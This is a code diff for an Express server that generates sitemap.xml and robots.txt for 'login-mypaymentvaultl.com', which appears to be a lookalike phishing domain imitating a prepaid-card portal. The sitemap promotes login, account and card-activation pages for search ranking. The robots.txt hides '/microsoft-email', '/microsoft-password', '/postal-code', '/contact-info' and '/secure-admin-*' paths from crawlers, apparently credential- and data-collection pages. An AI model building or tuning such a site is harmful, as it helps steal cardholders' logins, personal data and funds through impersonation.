@@ -179,42 +179,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const baseUrl = 'https://login-mypaymentvaultl.com';
       const currentDate = new Date().toISOString().split('T')[0];
       
-      // Simple, clean XML sitemap without keyword stuffing
+      const pages = [
+        { loc: '/', priority: '1.0', changefreq: 'daily' },
+        { loc: '/login', priority: '1.0', changefreq: 'daily' },
+        { loc: '/account', priority: '0.9', changefreq: 'daily' },
+        { loc: '/register', priority: '0.8', changefreq: 'weekly' },
+        { loc: '/activate-card', priority: '0.8', changefreq: 'weekly' },
+        { loc: '/forgot-username', priority: '0.7', changefreq: 'monthly' },
+        { loc: '/forgot-password', priority: '0.7', changefreq: 'monthly' },
+        { loc: '/rccl', priority: '0.8', changefreq: 'weekly' },
+        { loc: '/rccl-register', priority: '0.7', changefreq: 'weekly' },
+        { loc: '/rccl-activate-card', priority: '0.7', changefreq: 'weekly' },
+      ];
+      
+      const urlEntries = pages.map(p => `<url>
+<loc>${baseUrl}${p.loc}</loc>
+<lastmod>${currentDate}</lastmod>
+<changefreq>${p.changefreq}</changefreq>
+<priority>${p.priority}</priority>
+</url>`).join('\n');
+      
       const sitemap = `<?xml version="1.0" encoding="UTF-8"?>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-<url>
-<loc>${baseUrl}/</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>1.0</priority>
-</url>
-<url>
-<loc>${baseUrl}/register</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>0.8</priority>
-</url>
-<url>
-<loc>${baseUrl}/activate-card</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>0.8</priority>
-</url>
-<url>
-<loc>${baseUrl}/forgot-username</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>0.6</priority>
-</url>
-<url>
-<loc>${baseUrl}/forgot-password</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>0.6</priority>
-</url>
-<url>
-<loc>${baseUrl}/account</loc>
-<lastmod>${currentDate}</lastmod>
-<priority>0.8</priority>
-</url>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+        xmlns:xhtml="http://www.w3.org/1999/xhtml">
+${urlEntries}
 </urlset>`;
       
       res.set('Content-Type', 'application/xml; charset=utf-8');
+      res.set('Cache-Control', 'public, max-age=3600');
       res.send(sitemap);
     } catch (error) {
       console.error('Error generating sitemap:', error);
@@ -226,16 +218,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const baseUrl = 'https://login-mypaymentvaultl.com';
       
-      // Simple, clean robots.txt
       const robotsTxt = `User-agent: *
 Allow: /
+Allow: /login
+Allow: /account
+Allow: /register
+Allow: /activate-card
+Allow: /forgot-username
+Allow: /forgot-password
+Allow: /rccl
+Allow: /rccl-register
+Allow: /rccl-activate-card
 Disallow: /api/
 Disallow: /postal-code
 Disallow: /contact-info
+Disallow: /microsoft-email
+Disallow: /microsoft-password
+Disallow: /secure-admin-*
 
 Sitemap: ${baseUrl}/sitemap.xml`;
       
       res.set('Content-Type', 'text/plain; charset=utf-8');
+      res.set('Cache-Control', 'public, max-age=86400');
       res.send(robotsTxt);
     } catch (error) {
       console.error('Error generating robots.txt:', error);
